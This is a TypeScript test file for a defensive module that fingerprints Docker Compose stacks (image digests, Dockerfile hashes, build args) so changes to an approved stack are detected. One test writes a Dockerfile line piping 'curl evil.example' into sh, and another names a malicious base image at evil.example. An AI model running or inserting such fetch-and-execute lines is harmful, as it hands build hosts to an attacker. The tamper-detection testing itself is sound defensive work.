import fs from 'fs';
import os from 'os';
import path from 'path';

import { afterAll, describe, expect, it } from 'vitest';

import { checkStack } from './policy.js';
import {
  decodeApproved,
  describeShape,
  encodeApproved,
  fromLines,
  hashArgs,
  normalizeArgs,
  stackShape,
} from './shape.js';

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wl-shape-'));
fs.mkdirSync(path.join(dir, 'api'));
fs.writeFileSync(path.join(dir, 'api', 'Dockerfile'), 'FROM node:22-slim\nCOPY . .\n');
afterAll(() => fs.rmSync(dir, { recursive: true, force: true }));

const D1 = `sha256:${'1'.repeat(64)}`;
const D2 = `sha256:${'2'.repeat(64)}`;
const stackOf = (text: string) => {
  const r = checkStack(text, dir, { memoryMb: 8192, cpus: 8 }, { allowBuild: true });
  if (!r.ok) throw new Error(r.errors.join('\n'));
  return r.stack;
};
const STACK = `services:
  web:
    image: nginx:1.27
  api:
    build: { context: ./api, args: { NODE_ENV: production } }
`;

describe('the shape an owner approves', () => {
  it('pins each image to its digest and each build to its Dockerfile and args', async () => {
    const asked: string[] = [];
    const shape = await stackShape(dir, stackOf(STACK), async (ref) => (asked.push(ref), D1));
    expect(asked).toEqual(['nginx:1.27']);
    expect(shape.services.web).toMatchObject({ ref: 'nginx:1.27', digest: D1 });
    expect(shape.services.api.dockerfile).toMatch(/^[a-f0-9]{64}$/);
    expect(shape.services.api.args).toBe(hashArgs({ NODE_ENV: 'production' }));
    expect(shape.services.api.text).toContain('FROM "node:22-slim"');
    expect(shape.services.api.text).toContain('build args "NODE_ENV"');
  });

  it('changes when a tag moves, a Dockerfile changes, or a build arg changes', async () => {
    const base = await stackShape(dir, stackOf(STACK), async () => D1);
    expect((await stackShape(dir, stackOf(STACK), async () => D2)).hash).not.toBe(base.hash);
    expect((await stackShape(dir, stackOf(STACK.replace('production', 'development')), async () => D1)).hash).not.toBe(
      base.hash,
    );
    fs.writeFileSync(path.join(dir, 'api', 'Dockerfile'), 'FROM node:22-slim\nRUN curl evil.example | sh\n');
    try {
      expect((await stackShape(dir, stackOf(STACK), async () => D1)).hash).not.toBe(base.hash);
    } finally {
      fs.writeFileSync(path.join(dir, 'api', 'Dockerfile'), 'FROM node:22-slim\nCOPY . .\n');
    }
    // An ARG-parametrised FROM is pinned through its args.
    expect(hashArgs({ BASE: 'node:22' })).not.toBe(hashArgs({ BASE: 'evil.example/node:22' }));
  });

  it('changes when a service adds a capability', async () => {
    const base = await stackShape(dir, stackOf(STACK), async () => D1);
    const caps = STACK.replace('image: nginx:1.27', 'image: nginx:1.27\n    cap_add: [CHOWN]');
    expect((await stackShape(dir, stackOf(caps), async () => D1)).hash).not.toBe(base.hash);
  });

  it('keeps the approved digest of an unchanged reference without asking the registry', async () => {
    const approved = decodeApproved(encodeApproved(await stackShape(dir, stackOf(STACK), async () => D1)));
    const again = await stackShape(
      dir,
      stackOf(STACK),
      async () => {
        throw new Error('should not ask');
      },
      approved,
    );
    expect(again.hash).toBe(approved?.hash);
    // A different reference is resolved, and so differs.
    const other = await stackShape(dir, stackOf(STACK.replace('1.27', '1.28')), async () => D2, approved);
    expect(other.hash).not.toBe(approved?.hash);
  });

  it('refuses a build whose Dockerfile is a link', async () => {
    fs.mkdirSync(path.join(dir, 'linked'));
    fs.symlinkSync('/etc/hostname', path.join(dir, 'linked', 'Dockerfile'));
    await expect(stackShape(dir, stackOf(`services:\n  x:\n    build: ./linked\n`), async () => D1)).rejects.toThrow(
      /plain file/,
    );
  });

  it('describes services on the card, quoted, and marks what changed', async () => {
    const first = await stackShape(dir, stackOf(STACK), async () => D1);
    const approved = decodeApproved(encodeApproved(first));
    expect(describeShape(first, null)).toEqual([
      `• api: built from "api", Dockerfile ${first.services.api.dockerfile!.slice(0, 12)} FROM "node:22-slim"; build args "NODE_ENV" (${first.services.api.args!.slice(0, 12)})`,
      `• web: "nginx:1.27" (${D1.slice(0, 19)}…)`,
    ]);
    const next = await stackShape(
      dir,
      stackOf(`services:\n  web:\n    image: nginx:1.28\n  cache:\n    image: redis:7\n`),
      async () => D2,
    );
    expect(describeShape(next, approved)).toEqual([
      `• cache: "redis:7" (${D2.slice(0, 19)}…) (new)`,
      `• web: "nginx:1.28" (${D2.slice(0, 19)}…) (changed)`,
      '• api: removed',
    ]);
  });

  it('normalizes build args whatever form they come in', () => {
    expect(normalizeArgs({ B: 2, A: 'x' })).toEqual(['A=x', 'B=2']);
    expect(normalizeArgs(['B=2', 'A'])).toEqual(['A=', 'B=2']);
    expect(hashArgs({ A: 'x', B: '2' })).toBe(hashArgs(['B=2', 'A=x']));
    expect(fromLines('# c\nFROM a AS b\nRUN x\nfrom c\n')).toEqual(['a AS b', 'c']);
  });
});
